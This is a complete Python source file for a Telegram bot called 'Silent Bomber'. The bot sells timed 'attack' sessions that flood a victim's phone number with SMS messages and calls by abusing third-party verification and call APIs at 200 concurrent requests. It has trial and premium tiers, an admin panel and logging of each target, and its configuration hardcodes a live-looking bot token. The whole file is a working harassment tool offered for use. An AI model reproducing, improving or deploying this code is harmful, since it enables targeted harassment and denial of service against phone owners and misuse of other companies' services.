import logging
import json
import asyncio
import time
import aiohttp
import os
import sys
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# ============= CONFIGURATION =============
BOT_TOKEN = "8574456133:AAG7e_8GYsqswxd9Sd5F73hr1TGoMsmz68w"
ADMIN_IDS = [7290031191]  # Add more admin IDs separated by commas: [7290031191, 123456789, 987654321]
LOG_GROUP_ID = -1002939205294
MAX_SESSIONS = 50
CONCURRENT_REQUESTS = 200
TRIAL_DURATION_MINUTES = 5
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")  # Set this in Railway for webhook mode
# ==========================================

# Setup logging
logging.basicConfig(
    format='%(asctime)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# Global data structures
user_data = {}
active_sessions = {}
protected_numbers = set()
trial_used = set()

def save_user_data():
    """Save user data to JSON file"""
    try:
        with open('user_data.json', 'w') as f:
            json.dump({
                "users": user_data,
                "protected_numbers": list(protected_numbers),
                "trial_used": list(trial_used)
            }, f, indent=2)
        logger.info("User data saved successfully")
    except Exception as e:
        logger.error(f"Error saving user data: {e}")

def load_user_data():
    """Load user data from JSON file"""
    global user_data, protected_numbers, trial_used
    try:
        with open('user_data.json', 'r') as f:
            data = json.load(f)
            user_data = data.get("users", {})
            protected_numbers = set(data.get("protected_numbers", []))
            trial_used = set(data.get("trial_used", []))
        logger.info(f"Loaded {len(user_data)} users from file")
    except FileNotFoundError:
        logger.info("No user_data.json found, creating new")
        for admin_id in ADMIN_IDS:
            user_data[str(admin_id)] = {
                "authorized": True,
                "max_sessions": 999,
                "is_premium": True,
                "joined_date": datetime.now().isoformat(),
                "trial_used": False
            }
        save_user_data()
    except Exception as e:
        logger.error(f"Error loading user data: {e}")

def load_apis():
    """Load API configurations from file"""
    try:
        with open('apidata.json', 'r') as f:
            data = json.load(f)
        
        sms_apis = []
        call_apis = []
        
        if isinstance(data, dict):
            if 'sms' in data:
                sms_data = data['sms']
                if isinstance(sms_data, dict):
                    for country_code, apis in sms_data.items():
                        if isinstance(apis, list):
                            sms_apis.extend(apis)
                elif isinstance(sms_data, list):
                    sms_apis = sms_data
            
            if 'call' in data:
                call_data = data['call']
                if isinstance(call_data, dict):
                    for country_code, apis in call_data.items():
                        if isinstance(apis, list):
                            call_apis.extend(apis)
                elif isinstance(call_data, list):
                    call_apis = call_data
        
        elif isinstance(data, list):
            for item in data:
                if isinstance(item, dict):
                    sms_apis.append(item)
        
        whatsapp_apis = [api for api in sms_apis if 'whatsapp' in api.get('name', '').lower() or 'whatsapp' in api.get('url', '').lower()]
        
        logger.info(f"APIs Loaded - SMS: {len(sms_apis)}, Call: {len(call_apis)}, WA: {len(whatsapp_apis)}")
        
        return {
            "sms": sms_apis,
            "call": call_apis,
            "whatsapp": whatsapp_apis
        }
    except FileNotFoundError:
        logger.warning("apidata.json not found! Creating empty API file...")
        # Create empty apidata.json to avoid errors
        with open('apidata.json', 'w') as f:
            json.dump({"sms": [], "call": []}, f)
        return {"sms": [], "call": [], "whatsapp": []}
    except Exception as e:
        logger.error(f"Error loading APIs: {e}")
        return {"sms": [], "call": [], "whatsapp": []}

async def execute_api(session, api_config, target):
    """Execute single API request"""
    try:
        url = api_config['url'].replace("{target}", target)
        method = api_config.get('method', 'POST').upper()
        
        headers = {}
        for k, v in api_config.get('headers', {}).items():
            if isinstance(v, str) and "{target}" in v:
                headers[k] = v.replace("{target}", target)
            else:
                headers[k] = v
        
        payload_json = None
        payload_data = None
        params = None

        if 'json' in api_config:
            json_str = json.dumps(api_config['json'])
            json_str = json_str.replace("{target}", target)
            payload_json = json.loads(json_str)
        
        if 'data' in api_config:
            payload_data = {}
            for k, v in api_config['data'].items():
                if isinstance(v, str) and "{target}" in v:
                    payload_data[k] = v.replace("{target}", target)
                else:
                    payload_data[k] = v
        
        if 'params' in api_config:
            params = {}
            for k, v in api_config['params'].items():
                if isinstance(v, str) and "{target}" in v:
                    params[k] = v.replace("{target}", target)
                else:
                    params[k] = v

        async with session.request(
            method, url, 
            headers=headers, 
            json=payload_json, 
            data=payload_data, 
            params=params, 
            timeout=aiohttp.ClientTimeout(total=3),
            ssl=False
        ) as response:
            return True
    except Exception:
        return False

async def worker(target, apis, session_data):
    """Background worker for sending requests"""
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, force_close=True)
    timeout = aiohttp.ClientTimeout(total=5)
    
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        logger.info(f"Worker started for target: {target}")
        
        while session_data['active'] and datetime.now() < session_data['expiry']:
            all_apis = []
            all_apis.extend(apis.get('sms', []))
            all_apis.extend(apis.get('call', []))
            
            if not all_apis:
                logger.warning("No APIs available!")
                break
            
            for i in range(0, len(all_apis), CONCURRENT_REQUESTS):
                if not session_data['active']:
                    break
                
                batch = all_apis[i:i + CONCURRENT_REQUESTS]
                tasks = [execute_api(session, api, target) for api in batch]
                results = await asyncio.gather(*tasks, return_exceptions=True)
                
                for result in results:
                    session_data['total_sent'] += 1
                    if result is True:
                        session_data['success_count'] += 1
                
                await asyncio.sleep(0.05)
            
            await asyncio.sleep(0.3)

def get_progress_bar(percent):
    """Generate progress bar"""
    filled = int(percent / 10)
    return "█" * filled + "░" * (10 - filled)

def get_user_tier(user_id):
    """Get user tier"""
    user = user_data.get(str(user_id), {})
    if user.get("is_premium"):
        return "💎 PREMIUM"
    elif user.get("authorized"):
        return "✅ BASIC"
    return "🆕 NEW USER"

async def log_to_group(context, user_id, username, target, session_type, session_id, first_name="Unknown"):
    """Log session start to group"""
    if LOG_GROUP_ID == 0:
        logger.warning("LOG_GROUP_ID is 0, cannot send log")
        return
    
    try:
        user_mention = f"@{username}" if username and username != "No Username" else first_name
        
        log_message = (
            f"🔔 **NEW SESSION STARTED**\n"
            f"{'═' * 25}\n"
            f"👤 **User:** {user_mention}\n"
            f"🆔 **User ID:** `{user_id}`\n"
            f"📱 **Name:** {first_name}\n"
            f"📞 **Target:** `{target}`\n"
            f"💎 **Type:** {session_type}\n"
            f"🆔 **Session ID:** `{session_id}`\n"
            f"⏰ **Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{'═' * 25}\n"
            f"🤖 Bot by @Silent_is_here"
        )
        
        await context.bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=log_message,
            parse_mode="Markdown"
        )
        logger.info(f"Log sent to group for session: {session_id}")
        
    except Exception as e:
        logger.error(f"Failed to send log to group: {e}")

async def log_session_end(context, session_data, session_id):
    """Log session end to group"""
    if LOG_GROUP_ID == 0:
        return
    
    try:
        elapsed = datetime.now() - session_data['start_time']
        success_rate = (session_data['success_count'] / session_data['total_sent'] * 100) if session_data['total_sent'] > 0 else 0
        
        end_message = (
            f"🛑 **SESSION ENDED**\n"
            f"{'═' * 25}\n"
            f"🆔 **Session:** `{session_id}`\n"
            f"📞 **Target:** `{session_data['target']}`\n"
            f"⏱ **Duration:** `{str(elapsed).split('.')[0]}`\n"
            f"📨 **Total Sent:** `{session_data['total_sent']:,}`\n"
            f"✅ **Success:** `{session_data['success_count']:,}`\n"
            f"📈 **Rate:** `{success_rate:.1f}%`\n"
            f"💎 **Plan:** {session_data.get('plan', 'Unknown')}\n"
            f"👤 **User:** {session_data.get('username', 'Unknown')}\n"
            f"⏰ **Ended:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"{'═' * 25}"
        )
        
        await context.bot.send_message(
            chat_id=LOG_GROUP_ID,
            text=end_message,
            parse_mode="Markdown"
        )
        logger.info(f"End log sent for session: {session_id}")
        
    except Exception as e:
        logger.error(f"Failed to send end log: {e}")

async def ui_manager(context, chat_id, message_id, session_id):
    """Update UI for active session"""
    last_update = 0
    
    while session_id in active_sessions and active_sessions[session_id]['active']:
        current_time = time.time()
        
        if current_time - last_update < 3:
            await asyncio.sleep(0.1)
            continue
        
        last_update = current_time
        data = active_sessions[session_id]
        elapsed = datetime.now() - data['start_time']
        remaining = data['expiry'] - datetime.now()
        
        if remaining.total_seconds() <= 0:
            data['active'] = False
            await log_session_end(context, data, session_id)
            try:
                await context.bot.edit_message_text(
                    f"⏰ **SESSION EXPIRED**\n\n"
                    f"🎯 Target: `{data['target']}`\n"
                    f"📨 Sent: `{data['total_sent']:,}`\n"
                    f"✅ Success: `{data['success_count']:,}`",
                    chat_id, message_id,
                    parse_mode="Markdown"
                )
            except:
                pass
            break

        session_duration = (data['expiry'] - data['start_time']).total_seconds()
        percent = min(100, int((elapsed.total_seconds() / session_duration) * 100)) if session_duration > 0 else 0
        success_rate = (data['success_count'] / data['total_sent'] * 100) if data['total_sent'] > 0 else 0
        rps = data['total_sent'] / max(1, elapsed.total_seconds())

        text = (
            f"🔥 **ATTACK IN PROGRESS**\n"
            f"{'═' * 20}\n\n"
            f"🎯 **TARGET:** `{data['target']}`\n"
            f"⚡ **STATUS:** 🟢 ACTIVE\n"
            f"📊 **PROGRESS:** {get_progress_bar(percent)} {percent}%\n"
            f"{'═' * 20}\n"
            f"⏱ **ELAPSED:** `{str(elapsed).split('.')[0]}`\n"
            f"⏳ **REMAINING:** `{str(remaining).split('.')[0]}`\n"
            f"{'═' * 20}\n"
            f"📨 **SENT:** `{data['total_sent']:,}`\n"
            f"✅ **SUCCESS:** `{data['success_count']:,}`\n"
            f"📈 **RATE:** `{success_rate:.1f}%`\n"
            f"⚡ **SPEED:** `{rps:.0f} req/sec`\n"
            f"💎 **Plan:** {data.get('plan', 'TRIAL')}"
        )
        
        kb = [[InlineKeyboardButton("🛑 STOP ATTACK", callback_data=f"stop_{session_id}")]]
        
        try:
            await context.bot.edit_message_text(
                text, chat_id, message_id, 
                reply_markup=InlineKeyboardMarkup(kb), 
                parse_mode="Markdown"
            )
        except:
            pass

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    user_name = update.effective_user.first_name
    
    if str(user_id) not in user_data:
        user_data[str(user_id)] = {
            "authorized": False,
            "max_sessions": 0,
            "is_premium": False,
            "joined_date": datetime.now().isoformat(),
            "trial_used": False
        }
        save_user_data()
        logger.info(f"New user registered: {user_id} - {user_name}")
    
    tier = get_user_tier(user_id)
    user_info = user_data[str(user_id)]
    trial_status = "✅ Available" if not user_info.get("trial_used") else "❌ Used"
    user_sessions = len([s for s in active_sessions.values() if s.get('user_id') == user_id])
    
    welcome_text = (
        f"╔══════════════════════╗\n"
        f"║   🔥 SILENT BOMBER 🔥   ║\n"
        f"╚══════════════════════╝\n\n"
        f"👋 **Welcome, {user_name}!**\n\n"
        f"📊 **YOUR STATUS**\n"
        f"├ Tier: {tier}\n"
        f"├ User ID: `{user_id}`\n"
        f"├ Active Sessions: `{user_sessions}`\n"
        f"├ Trial: {trial_status}\n"
        f"└ Max Sessions: `{user_info.get('max_sessions', 0)}`\n\n"
        f"🎁 **TRIAL SYSTEM**\n"
        f"• New users get 1 free {TRIAL_DURATION_MINUTES}-min trial\n"
        f"• Authorized users get 1 session\n"
        f"• Premium users get unlimited\n\n"
        f"📋 **COMMANDS**\n"
        f"├ /start - Main menu\n"
        f"├ /send [number] - Start attack\n"
        f"├ /status - Your account\n"
        f"├ /ping - Bot latency\n"
        f"└ /help - Help\n\n"
        f"⚠️ Include country code!"
    )
    
    kb = [
        [InlineKeyboardButton("🚀 START ATTACK", callback_data="menu_send"),
         InlineKeyboardButton("📊 MY STATUS", callback_data="menu_status")],
        [InlineKeyboardButton("ℹ️ HELP", callback_data="menu_help"),
         InlineKeyboardButton("💎 UPGRADE", callback_data="menu_upgrade")]
    ]
    
    await update.message.reply_text(welcome_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def start_session_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /send command"""
    user_id = update.effective_user.id
    user_id_str = str(user_id)
    username = update.effective_user.username or "No Username"
    first_name = update.effective_user.first_name
    
    logger.info(f"Session request from: {user_id} ({first_name})")
    
    if user_id_str not in user_data:
        await update.message.reply_text("❌ Use /start first!", parse_mode="Markdown")
        return
    
    user_info = user_data[user_id_str]
    is_authorized = user_info.get("authorized", False)
    is_premium = user_info.get("is_premium", False)
    trial_used_by_user = user_info.get("trial_used", False) or user_id_str in trial_used
    max_sessions = user_info.get("max_sessions", 0)
    
    user_sessions = len([s for s in active_sessions.values() if s.get('user_id') == user_id])
    
    can_use_trial = not trial_used_by_user and not is_authorized
    can_use_basic = is_authorized and user_sessions < max_sessions
    can_use_premium = is_premium
    
    if not (can_use_trial or can_use_basic or can_use_premium):
        if not is_authorized and trial_used_by_user:
            await update.message.reply_text("❌ **TRIAL EXPIRED**\nContact admin.", parse_mode="Markdown")
        elif is_authorized and user_sessions >= max_sessions:
            await update.message.reply_text(f"❌ **LIMIT REACHED**\nActive: {user_sessions}/{max_sessions}", parse_mode="Markdown")
        return
    
    if len(active_sessions) >= MAX_SESSIONS:
        await update.message.reply_text("❌ **SYSTEM FULL**\nTry later.")
        return
    
    if not context.args:
        await update.message.reply_text("🚀 Usage: `/send 919XXXXXXXXX`", parse_mode="Markdown")
        return
    
    target = context.args[0]
    
    if target in protected_numbers:
        await update.message.reply_text("🛡️ **PROTECTED NUMBER**")
        return
    
    if len(target) < 10:
        await update.message.reply_text("❌ Min 10 digits.")
        return
    
    if can_use_trial:
        duration = timedelta(minutes=TRIAL_DURATION_MINUTES)
        plan_name = "🎁 TRIAL"
        user_data[user_id_str]["trial_used"] = True
        trial_used.add(user_id_str)
        save_user_data()
    elif can_use_premium:
        duration = timedelta(hours=24)
        plan_name = "💎 PREMIUM"
    else:
        duration = timedelta(hours=24)
        plan_name = "✅ BASIC"
    
    sid = f"s{int(time.time())}_{user_id}"
    active_sessions[sid] = {
        'target': target,
        'active': True,
        'start_time': datetime.now(),
        'expiry': datetime.now() + duration,
        'total_sent': 0,
        'success_count': 0,
        'user_id': user_id,
        'plan': plan_name,
        'username': username
    }
    
    duration_str = f"{TRIAL_DURATION_MINUTES} minutes" if can_use_trial else "24 hours"
    
    await log_to_group(context, user_id, username, target, plan_name, sid, first_name)
    
    msg = await update.message.reply_text(
        f"🔥 **ATTACK LAUNCHED**\n\n"
        f"🎯 Target: `{target}`\n"
        f"💎 Plan: {plan_name}\n"
        f"⏱ Duration: {duration_str}\n\n"
        f"🔄 **SENDING...**",
        parse_mode="Markdown"
    )
    
    apis = load_apis()
    
    asyncio.create_task(worker(target, apis, active_sessions[sid]))
    asyncio.create_task(ui_manager(context, update.effective_chat.id, msg.message_id, sid))

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    
    if str(user_id) not in user_data:
        await update.message.reply_text("❌ Use /start first.")
        return
    
    user_info = user_data[str(user_id)]
    user_sessions = [s for s in active_sessions.values() if s.get('user_id') == user_id]
    trial_status = "✅ Available" if not user_info.get("trial_used") else "❌ Used"
    
    status_text = (
        f"📊 **ACCOUNT STATUS**\n\n"
        f"👤 User: `{user_id}`\n"
        f"💎 Tier: {get_user_tier(user_id)}\n"
        f"🎁 Trial: {trial_status}\n"
        f"📨 Max Sessions: {user_info.get('max_sessions', 0)}\n"
        f"⚡ Active: {len(user_sessions)}\n"
    )
    
    if user_sessions:
        status_text += "\n📡 **ACTIVE SESSIONS**\n"
        for s in user_sessions:
            remaining = s['expiry'] - datetime.now()
            status_text += f"├ 🎯 `{s['target']}` | 📨 `{s['total_sent']:,}` | ⏳ `{str(remaining).split('.')[0]}`\n"
    
    await update.message.reply_text(status_text, parse_mode="Markdown")

async def ping_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /ping command"""
    start = time.time()
    msg = await update.message.reply_text("📡 Pinging...")
    latency = round((time.time() - start) * 1000)
    status = '🟢 Excellent' if latency < 100 else '🟡 Good' if latency < 300 else '🔴 Slow'
    await msg.edit_text(f"🏓 **PONG!**\n📡 `{latency}ms`\n⚡ {status}", parse_mode="Markdown")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /help command"""
    help_text = (
        f"📚 **COMMAND LIST**\n\n"
        f"🔹 `/start` - Start the bot\n"
        f"🔹 `/send [number]` - Start attack (include country code)\n"
        f"🔹 `/status` - Check your account status\n"
        f"🔹 `/ping` - Check bot latency\n"
        f"🔹 `/help` - Show this help message\n\n"
        f"📞 **Format Example**\n"
        f"`/send 919876543210`\n\n"
        f"⚠️ **Warning:** Misuse may result in ban!"
    )
    await update.message.reply_text(help_text, parse_mode="Markdown")

async def stopall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stopall command (admin only)"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    count = len(active_sessions)
    for sid in list(active_sessions.keys()):
        await log_session_end(context, active_sessions[sid], sid)
        active_sessions[sid]['active'] = False
    active_sessions.clear()
    
    await update.message.reply_text(f"🛑 **ALL SESSIONS STOPPED**\nStopped: {count} sessions")
    logger.info(f"All {count} sessions stopped by admin {update.effective_user.id}")

async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command (admin only)"""
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin only!")
        return
    
    total_users = len(user_data)
    authorized = sum(1 for u in user_data.values() if u.get("authorized"))
    premium = sum(1 for u in user_data.values() if u.get("is_premium"))
    active = len(active_sessions)
    
    text = (
        f"👑 **ADMIN PANEL**\n"
        f"{'═' * 25}\n"
        f"👥 Users: `{total_users}`\n"
        f"✅ Auth: `{authorized}`\n"
        f"💎 Premium: `{premium}`\n"
        f"🎁 Trials: `{len(trial_used)}`\n"
        f"⚡ Active: `{active}/{MAX_SESSIONS}`\n"
        f"🛡️ Protected: `{len(protected_numbers)}`\n"
    )
    
    kb = [
        [InlineKeyboardButton("📊 SESSIONS", callback_data="admin_sessions"),
         InlineKeyboardButton("🛑 STOP ALL", callback_data="admin_stopall")],
        [InlineKeyboardButton("🔄 REFRESH", callback_data="admin_refresh")]
    ]
    
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="Markdown")

async def auth_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /auth command (admin only)"""
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ `/auth [user_id]`")
        return
    
    target_id = str(context.args[0])
    
    user_data[target_id] = {
        "authorized": True,
        "max_sessions": 1,
        "is_premium": False,
        "trial_used": True,
        "authorized_by": str(update.effective_user.id),
        "authorized_date": datetime.now().isoformat(),
        "joined_date": user_data.get(target_id, {}).get("joined_date", datetime.now().isoformat())
    }
    save_user_data()
    
    await update.message.reply_text(f"✅ **AUTHORIZED**\nUser: `{target_id}`", parse_mode="Markdown")
    logger.info(f"User {target_id} authorized by {update.effective_user.id}")

async def upgrade_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /upgrade command (admin only)"""
    if update.effective_user.id not in ADMIN_IDS:
        return
    
    if not context.args:
        await update.message.reply_text("❌ `/upgrade [user_id]`")
        return
    
    target_id = str(context.args[0])
    
    if target_id not in user_data:
        await update.message.reply_text("❌ User not found!")
        return
    
    user_data[target_id].update({
        "authorized": True,
        "max_sessions": 999,
        "is_premium": True,
        "upgraded_by": str(update.effective_user.id),
        "upgraded_date": datetime.now().isoformat()
    })
    save_user_data()
    
    await update.message.reply_text(f"💎 **PREMIUM**\nUser: `{target_id}`", parse_mode="Markdown")
    logger.info(f"User {target_id} upgraded to premium")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    data = query.data
    
    if data.startswith("stop_"):
        sid = data.split("_", 1)[1]
        if sid in active_sessions:
            session_data = active_sessions[sid]
            session_data['active'] = False
            
            await log_session_end(context, session_data, sid)
            
            await query.answer("🛑 Stopping...")
            await query.edit_message_text(
                f"🛑 **STOPPED**\n📨 Sent: `{session_data['total_sent']:,}`\n✅ Success: `{session_data['success_count']:,}`",
                parse_mode="Markdown"
            )
            del active_sessions[sid]
            logger.info(f"Session {sid} stopped manually")
    
    elif data == "menu_send":
        await query.answer()
        await query.edit_message_text("🚀 `/send 919XXXXXXXXX`", parse_mode="Markdown")
    
    elif data == "menu_status":
        await query.answer()
        user_id = query.from_user.id
        if str(user_id) not in user_data:
            await query.edit_message_text("❌ Use /start first.")
            return
        
        user_info = user_data[str(user_id)]
        user_sessions = [s for s in active_sessions.values() if s.get('user_id') == user_id]
        trial_status = "✅ Available" if not user_info.get("trial_used") else "❌ Used"
        
        status_text = (
            f"📊 **YOUR STATUS**\n\n"
            f"💎 Tier: {get_user_tier(user_id)}\n"
            f"🎁 Trial: {trial_status}\n"
            f"📨 Max Sessions: {user_info.get('max_sessions', 0)}\n"
            f"⚡ Active: {len(user_sessions)}\n"
        )
        await query.edit_message_text(status_text, parse_mode="Markdown")
    
    elif data == "menu_help":
        await query.answer()
        help_text = (
            f"📚 **HOW TO USE**\n\n"
            f"1️⃣ Use `/send [number]` to start\n"
            f"2️⃣ Include country code (e.g., 91 for India)\n"
            f"3️⃣ Wait for the attack to start\n"
            f"4️⃣ Use stop button to end early\n\n"
            f"⚠️ **Note:** This is for educational purposes only!"
        )
        await query.edit_message_text(help_text, parse_mode="Markdown")
    
    elif data == "menu_upgrade":
        await query.answer()
        upgrade_text = (
            f"💎 **UPGRADE OPTIONS**\n\n"
            f"✅ **BASIC Plan** - 1 session (24h)\n"
            f"💎 **PREMIUM Plan** - Unlimited sessions (24h)\n\n"
            f"Contact @Silent_is_here for pricing!"
        )
        await query.edit_message_text(upgrade_text, parse_mode="Markdown")
    
    elif data == "admin_stopall":
        await query.answer()
        count = len(active_sessions)
        for sid in list(active_sessions.keys()):
            await log_session_end(context, active_sessions[sid], sid)
            active_sessions[sid]['active'] = False
        active_sessions.clear()
        await query.edit_message_text(f"🛑 **ALL STOPPED**\nStopped: {count} sessions")
        logger.info(f"All {count} sessions stopped via button")
    
    elif data == "admin_sessions":
        await query.answer()
        if not active_sessions:
            await query.edit_message_text("ℹ️ No active sessions.")
        else:
            text = "📊 **ACTIVE SESSIONS**\n\n"
            for sid, d in list(active_sessions.items())[:20]:
                text += f"🎯 `{d['target']}` | {d.get('plan', '?')} | 👤 {d.get('username', '?')}\n"
            await query.edit_message_text(text, parse_mode="Markdown")
    
    elif data == "admin_refresh":
        await query.answer()
        total_users = len(user_data)
        authorized = sum(1 for u in user_data.values() if u.get("authorized"))
        premium = sum(1 for u in user_data.values() if u.get("is_premium"))
        active = len(active_sessions)
        
        text = (
            f"👑 **ADMIN PANEL**\n"
            f"{'═' * 25}\n"
            f"👥 Users: `{total_users}`\n"
            f"✅ Auth: `{authorized}`\n"
            f"💎 Premium: `{premium}`\n"
            f"🎁 Trials: `{len(trial_used)}`\n"
            f"⚡ Active: `{active}/{MAX_SESSIONS}`\n"
            f"🛡️ Protected: `{len(protected_numbers)}`\n"
        )
        await query.edit_message_text(text, parse_mode="Markdown")

async def health_check():
    """Simple health check endpoint for Railway"""
    from aiohttp import web
    
    async def handle(request):
        return web.Response(text="OK")
    
    app = web.Application()
    app.router.add_get('/', handle)
    app.router.add_get('/health', handle)
    
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', PORT)
    await site.start()
    logger.info(f"Health check server running on port {PORT}")

def main():
    """Main entry point"""
    logger.info("=" * 50)
    logger.info("SILENT BOMBER BOT STARTING")
    logger.info(f"Bot Token: {'*' * 10}{BOT_TOKEN[-5:] if len(BOT_TOKEN) > 5 else '*****'}")
    logger.info(f"LOG_GROUP_ID: {LOG_GROUP_ID}")
    logger.info(f"ADMIN_IDS: {ADMIN_IDS}")
    logger.info(f"MAX_SESSIONS: {MAX_SESSIONS}")
    logger.info(f"CONCURRENT_REQUESTS: {CONCURRENT_REQUESTS}")
    logger.info(f"PORT: {PORT}")
    logger.info(f"WEBHOOK_URL: {WEBHOOK_URL if WEBHOOK_URL else 'Not set (using polling)'}")
    logger.info("=" * 50)
    
    # Load user data
    load_user_data()
    
    # Create application
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Add command handlers
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("send", start_session_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("ping", ping_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("admin", admin_panel))
    app.add_handler(CommandHandler("auth", auth_user_command))
    app.add_handler(CommandHandler("upgrade", upgrade_user_command))
    app.add_handler(CommandHandler("stopall", stopall_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Start health check server
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.create_task(health_check())
    
    # Start bot
    logger.info("Bot is running...")
    
    if WEBHOOK_URL:
        # Webhook mode (for Railway)
        logger.info(f"Starting bot in WEBHOOK mode on port {PORT}")
        app.run_webhook(
            listen="0.0.0.0",
            port=PORT,
            url_path=BOT_TOKEN,
            webhook_url=f"{WEBHOOK_URL}/{BOT_TOKEN}"
        )
    else:
        # Polling mode (default)
        logger.info("Starting bot in POLLING mode")
        app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()